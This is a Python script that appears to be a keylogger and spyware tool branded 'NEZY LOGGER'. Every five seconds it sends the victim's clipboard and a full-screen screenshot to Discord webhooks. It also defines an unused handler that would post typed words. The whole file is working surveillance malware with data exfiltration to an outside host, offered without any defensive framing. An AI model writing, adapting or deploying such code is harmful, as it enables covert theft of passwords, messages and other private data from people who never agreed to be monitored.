import time
import os
import pyautogui
import requests
from pynput import keyboard
from discord_webhook import DiscordWebhook, DiscordEmbed
from PIL import ImageGrab
import pyperclip

WEBHOOK_URL_SCREENSHOTS = "ur webhook for screenshots"
WEBHOOK_URL_KEYS = "ur webhook for keys"
CLIPBOARD_WEBHOOK = "ur webhook for clipboards"


word_buffer = []

def send_word():
    global word_buffer
    if word_buffer:
        word = "".join(word_buffer)
        data = {
            "content": f"```word Typed: {word}```",
            "username": "NEZY LOGGER"
        }
        response = requests.post(WEBHOOK_URL_KEYS, json=data)
        if response.status_code == 204:
            print("keypress sent")
        else:
            print(f"fail send keys {response.status_code}")
        word_buffer = []

def on_press(key):
    global word_buffer
    try:
        if key.char.isalnum() or key.char in "-_'":
            word_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            send_word()

def capture_and_send_screenshot():
    screenshot = ImageGrab.grab()
    temp_path = os.path.join(os.path.expanduser("~"), "AppData\\Local\\Temp\\screenshot.png")
    screenshot.save(temp_path)
    print(f"saved screenshot {temp_path}")
    try:
        webhook = DiscordWebhook(url=WEBHOOK_URL_SCREENSHOTS)
        embed = DiscordEmbed(title="Screenshot Capture", description="Here is the latest screenshot.", color=242424)
        embed.set_author(name="Screenshot Bot", icon_url="https://i.imgur.com/NYWdLg6.png")
        embed.set_image(url="https://i.imgur.com/NYWdLg6.png")
        embed.set_footer(text="Captured and sent using Python")
        webhook.add_embed(embed)
        webhook.execute()
        with open(temp_path, "rb") as screenshot_file:
            webhook = DiscordWebhook(url=WEBHOOK_URL_SCREENSHOTS)
            webhook.add_file(file=screenshot_file.read(), filename="screenshot.png")
            webhook.execute()

        print("sent screenshot")

    except Exception as e:
        print(f"error sending screenshot {e}")
    try:
        os.remove(temp_path)
        print("deleted temp screenshot")
    except Exception as e:
        print(f"error deleting temp file {e}")
        
while True:
    clipboard = pyperclip.paste()
    data = {
        "content": f"{clipboard}"
    }
    send_clipboard = requests.post(CLIPBOARD_WEBHOOK, json=data)
    capture_and_send_screenshot()
    time.sleep(5)
